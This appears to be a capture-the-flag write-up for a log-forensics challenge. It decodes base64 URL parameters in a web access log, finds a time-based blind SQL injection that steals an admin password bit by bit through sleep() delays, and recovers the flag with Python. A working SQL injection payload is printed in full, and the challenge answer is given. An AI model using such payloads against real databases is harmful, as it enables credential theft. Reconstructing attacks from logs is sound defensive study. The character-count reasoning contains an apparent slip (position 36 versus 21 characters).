# weblogs - Writeup

After a sharp look at the log, the following log-format ca be recognized:

```text
IP - - [timestamp] "URL" status_code size "-" "-"
```

From the URL we can extract the following information:

* `GET`-request was used to access `/admin/` and two GET-parameters are given: `action` and `sort`.
  * `action` always has the value `users`.
  * `order` looks random on first sight. But it contains repititions and some end on `%3D`.

A little knowledge of URL-encoding helps to see, that `%3D` is the URL-encoded representation of `=`. This raises the assumption, that `sort` is a base64-encoded string. Decoding all order strings reveals SQL statements and therefore proofs the base64-assumption to be correct.

The extraction and decoding of the sql statements can be easily automated using a little Python3

```python
import base64
import urllib.parse

def decode_url_params(access_log):
    with open(access_log, "r") as f:
        # extract all bas64 strings
        links = []
        for line in f:
            links.append(line.split(' ')[6].split('=')[2])
            pass
        pass
    # convert all '%3D' to '='
    http_decoded = [urllib.parse.unquote(l) for l in links]
    # base64 decode
    clean_log = [base64.b64decode(d) for d in http_decoded]
    # print
    for log in clean_log:
        print(log.decode('ascii'))
        pass
    pass
```

It assumes the log to be located in "access.log" in the current folder and prints the sql statements to stdout.
The first decoded order string is the following:

```sql
ASC,(
    select (
        case field(
            concat(
                substring(bin(ascii(substring(password,1,1))),1,1),
                substring(bin(ascii(substring(password,1,1))),2,1)
            ),
            concat(char(48),char(48)),
            concat(char(48),char(49)),
            concat(char(49),char(48)),
            concat(char(49),char(49))
        )
        when 1 then TRUE
        when 2 then sleep(2)
        when 3 then sleep(4)
        when 4 then sleep(6)
        end)
    from users
    where id=1
    )
```

Having a lot of sql statements being send to the server and the sql statements containing `sleep()` statements makes us assume, that a blind sql injection took place. The general format of those sql statements is `select ... from users where id=1`. The access of the table `users` shows, that a user table is accessed. The target `id` is `1`, which probably belongs to an admin user. The access of `password` in the select-section gives the hint, that a password was stolen. Therefore the stolen (admin) password is the flag to be found in this challenge.

We now try to get the password to solve this challenge.

We observe, that `substring(password,36,1)` occurs in the last request. Therefore the password has 21 characters. There are 4 requests per character, each extracting 2 bits of the character (except the 4th request: it extracts 1 bit, because ascii values can be represented by 7 bits in total). For the requests on two bits, the answer takes 0, 2, 4 or 6 seconds if the two bits are 00, 01, 10 or 11. If requesting the 7th bit, it takes 2 or 4 seconds if bit 7 is 0 or 1.

The timestamps and the logs are extracted using a little more Python3:

```python
def extract_timestamps(access_log):
    from datetime import datetime
    with open(access_log, 'r') as f:
        tss = []
        for line in f:
            ts = line.split('[')[1].split(']')[0]
            dt = datetime.strptime(ts, '%d/%b/%Y:%H:%M:%S %z')
            tss.append(dt)
        return tss

def recover_flag(access_log):
    from datetime import timedelta
    tss = extract_timestamps(access_log)
    tds = [tss[i] - tss[i-1] for i in range(1, len(tss))]
    s = list()
    for i, td in enumerate(tds):
        if i % 4 == 0:
            st = ''
        if td == timedelta(seconds=0) or ((i % 4) == 3 and td == timedelta(seconds=2)):
            st = '00' + st
        elif td == timedelta(seconds=2) or ((i % 4) == 3 and td == timedelta(seconds=4)):
            st = '01' + st
        elif td == timedelta(seconds=4):
            st = '10' + st
        elif td == timedelta(seconds=6):
            st = '11' + st
        else:
            print('Uh oh, there is something fishy!')
        if i % 4 == 3:
            s.append(chr(int(st, 2)))
        pass
    flag = ''.join(s)
    print(flag)

if __name__ == '__main__':
    import sys
    decode_url_params(sys.argv[1])
    recover_flag(sys.argv[1])
```

and the stolen flag is computed:

`SSH{Bl1ndSQLi_in_th3_l0g5_f32c3e5f}`

(The last character is the NULL byte terminating the string and is not part of the flag)
